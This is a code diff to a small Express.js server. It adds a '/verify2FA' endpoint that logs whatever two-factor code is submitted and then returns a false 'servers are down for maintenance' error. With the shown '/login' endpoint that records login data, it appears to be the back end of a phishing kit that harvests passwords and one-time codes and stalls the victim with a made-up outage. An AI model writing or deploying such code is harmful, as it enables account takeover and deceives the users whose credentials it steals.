@@ -13,6 +13,15 @@ app.post('/login', (req, res) => {
     res.status(200).send('Login data received');
 });
 
+// Endpoint to handle 2FA verification
+app.post('/verify2FA', (req, res) => {
+    // Log the received 2FA code
+    console.log('2FA verification code received:', req.body.verificationCode);
+
+    // Simulate a server error response
+    res.status(503).send('Servers are down for maintenance, please try again in a few hours');
+});
+
 app.listen(port, () => {
     console.log(`Server listening at http://localhost:${port}`);
 });
